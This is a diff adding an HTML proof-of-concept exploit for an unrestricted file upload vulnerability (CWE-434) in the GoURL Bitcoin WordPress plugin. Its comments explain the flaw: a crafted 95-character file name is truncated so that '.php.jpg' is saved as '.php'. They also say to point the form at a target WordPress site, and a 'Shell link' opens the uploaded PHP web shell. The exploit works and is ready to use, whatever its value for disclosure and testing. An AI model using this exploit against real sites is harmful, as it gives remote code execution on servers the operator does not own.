@@ -1,0 +1,37 @@
+<html>
+    <!--
+
+        GoURL Unrestricted Upload Vulnerablity POC by @pouyadarabi      
+        CWE-434
+
+        Vulnerable Fucntion: https://github.com/cryptoapi/Bitcoin-Wordpress-Plugin/blob/8aa17068d7ba31a05f66e0ab2bbb55efb0f60017/gourl.php#L5637
+        
+        Details:
+        
+          After checking file extention substring was used for file name to select first 95 letter line #5655
+          So enter file name like "123456789a123456789b123456789c123456789d123456789e123456789f123456789g123456789h123456789i1.php.jpg"
+          will upload a file with .php extention in website :)
+
+    -->
+
+<body>
+
+    <!--
+
+        Replace http://127.0.0.1/wp/ with target wordpress website
+        Fill id param in form action to any active download product
+
+    -->
+
+    <form action="http://127.0.0.1/wp/?page=gourlfile&id=1" method="POST" enctype="multipart/form-data">
+
+        <input type="file" name="gourlimage2" />
+        <input type="submit"/>
+        
+    </form>
+
+    <a href="http://127.0.0.1/wp/wp-content/uploads/gourl/images/i123456789a123456789b123456789c123456789d123456789e123456789f123456789g123456789h123456789i1.php">Shell link</a>
+
+</body>
+
+</html>
